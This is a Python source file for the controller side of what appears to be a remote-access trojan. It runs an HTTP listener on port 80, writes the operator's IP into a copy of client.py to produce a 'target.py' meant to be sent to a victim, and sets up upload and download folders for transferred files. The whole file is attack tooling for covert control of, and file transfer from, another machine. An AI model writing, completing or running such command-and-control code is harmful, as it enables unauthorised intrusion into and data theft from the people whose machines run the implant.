#!/usr/bin/python3
from server import HTTPHandler
from http.server import HTTPServer
import socket as s
import os

class Controller():
    def __init__(self,ip):
        self.ip=ip

    def start(self):
        try:
            httpd = HTTPServer((self.ip, 80), HTTPHandler)
            print("taget.py is created, Now send the target.py to target")
            print(f"Server started on {self.ip}:80\nWaiting for target to connect...")
            self.setupFiles()
            httpd.serve_forever()
        except PermissionError as e:
            print (f"Cant' start the server on {self.ip}:80 \nRUN WITH SUDO")
        except Exception as e:
            print(str(e))

    def setupFiles(self):
        try:
            with open('client.py', 'r') as file :
                filedata = file.read()
            find='server=None'
            replace=f'server = "http://{self.ip}"'
            filedata = filedata.replace(find, replace)
            with open('target.py', 'w') as file:
                file.write(filedata)
            
            if not os.path.exists("uploads"):
                os.mkdir("uploads")  
            if not os.path.exists("downloads"):
                os.mkdir("downloads")  

        except PermissionError as e:
            print("You need write permission better try out with sudo")

        except Exception as e:
            print(str(e)) 
    
